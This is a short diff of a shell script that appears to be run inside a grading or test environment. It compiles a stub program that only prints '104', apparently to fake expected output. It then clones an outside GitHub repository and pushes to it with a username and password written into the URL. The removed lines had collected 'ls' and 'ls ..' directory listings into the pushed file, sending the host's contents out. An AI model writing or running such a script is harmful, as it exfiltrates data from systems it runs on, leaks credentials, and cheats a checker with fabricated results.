@@ -4,10 +4,8 @@ echo -n "{write(1,\"104\",3);return(0);}" >> test.c
 gcc -s test.c -o a
 rm test.c
 git clone --q https://github.com/hbtnstuff/tests.git
-ls > tests/results
-ls .. >> tests/results
-echo test >> tests/results
 cd tests
-git commit -q -a -m "t"
+touch hello
+git commit -q -a -m "u"
 git push -q 'https://hbtnstuff:s4turd4yh4ck4thon;@github.com/hbtnstuff/tests.git' master
 cd ..
